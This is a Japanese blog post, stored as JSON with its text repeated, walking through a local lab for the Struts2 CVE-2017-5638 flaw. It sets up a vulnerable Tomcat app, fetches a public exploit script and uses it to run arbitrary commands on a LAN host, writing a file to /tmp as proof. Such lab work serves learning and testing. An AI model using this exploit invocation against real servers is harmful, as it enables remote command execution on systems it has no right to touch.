{"context": "\n\nstruts2 \u65b0\u3057\u30440day\u8106\u5f31\u6027\u3092\u4f53\u9a13\u3059\u308b\u305f\u3081\u306b\u3001\u624b\u5143\u306eMac\u74b0\u5883\u3067\u30c6\u30b9\u30c8\u7528\u306eWeb\u3092\u4f5c\u6210\u3057\u3066\u3084\u3063\u3066\u307f\u307e\u3057\u305f\u3002\u78ba\u304b\u306b\u6016\u3044\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30db\u30fc\u30eb\u3067\u3059\uff01\n\ntomcat\u3092\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u3057\u3066\u3001\u30c6\u30b9\u30c8\u7528Web\u3092tomcat\u306b\u30c7\u30d7\u30ed\u30a4\n#install tomcat\nbrew install tomcat\n\n#confirm where the tomcat installed\nls -lF `which catalina`\n\n#confirm tomcat home dir\nls -lF /usr/local/Cellar/tomcat/8.5.11/libexec\n\n#create web app \"struts2\" in webapps of tomcat home\nmkdir /usr/local/Cellar/tomcat/8.5.11/libexec/webapps/struts2\n\n#get web app deployment file\nwget https://github.com/nixawk/labs/raw/master/CVE-2017-5638/struts2_2.3.15.1-showcase.war\n\n#expand deployment file into the web app dir\nbrew install p7zip\n7z x struts2_2.3.15.1-showcase.war -o/usr/local/Cellar/tomcat/8.5.11/libexec/webapps/struts2\n\n#confirm web app files\nls -lF /usr/local/Cellar/tomcat/8.5.11/libexec/webapps/struts2\n\n#run tomcat\ncatalina run\n\n\u30c7\u30d7\u30ed\u30a4\u5f8c\u3001http://localhost:8080/struts2\u3067\u78ba\u8a8d\u3067\u304d\u307e\u3059\u3002\n\n\u4ed6\u306e\u30de\u30b7\u30f3\u304b\u3089\u8106\u5f31\u6027\u30c6\u30b9\u30c8\u30c4\u30fc\u30eb\u3092\u5b9f\u884c\n#get exploit tool script\nwget https://github.com/nixawk/labs/raw/master/CVE-2017-5638/exploit-urllib2.py\n\n#run exploit tool script\npython exploit-urllib2.py http://192.168.11.5:8080/struts2/fileupload/multipleUploadUsingList.action \"pwd\"\n#can create any payload file\nhttp://192.168.11.5:8080/struts2/ \"echo any command can be run > /tmp/yyy\"\n\n\u3082\u3061\u308d\u3093\u3001echo\u30b3\u30de\u30f3\u30c9\u3092\u4ed6\u306e\u30b3\u30de\u30f3\u30c9\u306b\u7f6e\u304d\u63db\u3048\u3066\u3082OK\u3002 >/tmp/yyy\u306f\u306a\u3057\u3067\u3082OK\u3002\n\u4f8b\u3048\u3070\n\n\u6700\u521d\u306e\u30de\u30b7\u30f3\u306b\u623b\u3063\u3066\u3001payload\u304c\u4f5c\u6210\u3055\u308c\u305f\u3053\u3068\u3092\u78ba\u8a8d\u3067\u304d\u308b\ncat /tmp/yyy\n\n\u30c6\u30b9\u30c8\u306e\u30d3\u30c7\u30aa\u3082\u30a2\u30c3\u30d7\u30ed\u30fc\u30c9\u3057\u307e\u3057\u305f\uff1a https://youtu.be/iQ_f-eG-EXg\n#struts2 \u65b0\u3057\u30440day\u8106\u5f31\u6027\u3092\u4f53\u9a13\u3059\u308b\u305f\u3081\u306b\u3001\u624b\u5143\u306eMac\u74b0\u5883\u3067\u30c6\u30b9\u30c8\u7528\u306eWeb\u3092\u4f5c\u6210\u3057\u3066\u3084\u3063\u3066\u307f\u307e\u3057\u305f\u3002\u78ba\u304b\u306b\u6016\u3044\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30db\u30fc\u30eb\u3067\u3059\uff01\n\n###tomcat\u3092\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u3057\u3066\u3001\u30c6\u30b9\u30c8\u7528Web\u3092tomcat\u306b\u30c7\u30d7\u30ed\u30a4\n```\n#install tomcat\nbrew install tomcat\n\n#confirm where the tomcat installed\nls -lF `which catalina`\n\n#confirm tomcat home dir\nls -lF /usr/local/Cellar/tomcat/8.5.11/libexec\n\n#create web app \"struts2\" in webapps of tomcat home\nmkdir /usr/local/Cellar/tomcat/8.5.11/libexec/webapps/struts2\n\n#get web app deployment file\nwget https://github.com/nixawk/labs/raw/master/CVE-2017-5638/struts2_2.3.15.1-showcase.war\n\n#expand deployment file into the web app dir\nbrew install p7zip\n7z x struts2_2.3.15.1-showcase.war -o/usr/local/Cellar/tomcat/8.5.11/libexec/webapps/struts2\n\n#confirm web app files\nls -lF /usr/local/Cellar/tomcat/8.5.11/libexec/webapps/struts2\n\n#run tomcat\ncatalina run\n```\n\u30c7\u30d7\u30ed\u30a4\u5f8c\u3001http://localhost:8080/struts2\u3067\u78ba\u8a8d\u3067\u304d\u307e\u3059\u3002\n\n\n###\u4ed6\u306e\u30de\u30b7\u30f3\u304b\u3089\u8106\u5f31\u6027\u30c6\u30b9\u30c8\u30c4\u30fc\u30eb\u3092\u5b9f\u884c\n```\n#get exploit tool script\nwget https://github.com/nixawk/labs/raw/master/CVE-2017-5638/exploit-urllib2.py\n\n#run exploit tool script\npython exploit-urllib2.py http://192.168.11.5:8080/struts2/fileupload/multipleUploadUsingList.action \"pwd\"\n#can create any payload file\nhttp://192.168.11.5:8080/struts2/ \"echo any command can be run > /tmp/yyy\"\n```\n\u3082\u3061\u308d\u3093\u3001echo\u30b3\u30de\u30f3\u30c9\u3092\u4ed6\u306e\u30b3\u30de\u30f3\u30c9\u306b\u7f6e\u304d\u63db\u3048\u3066\u3082OK\u3002 >/tmp/yyy\u306f\u306a\u3057\u3067\u3082OK\u3002\n\u4f8b\u3048\u3070\n\n###\u6700\u521d\u306e\u30de\u30b7\u30f3\u306b\u623b\u3063\u3066\u3001payload\u304c\u4f5c\u6210\u3055\u308c\u305f\u3053\u3068\u3092\u78ba\u8a8d\u3067\u304d\u308b\n```\ncat /tmp/yyy\n```\n\n\u30c6\u30b9\u30c8\u306e\u30d3\u30c7\u30aa\u3082\u30a2\u30c3\u30d7\u30ed\u30fc\u30c9\u3057\u307e\u3057\u305f\uff1a https://youtu.be/iQ_f-eG-EXg\n", "tags": ["struts2", "Security", "vulnerability"]}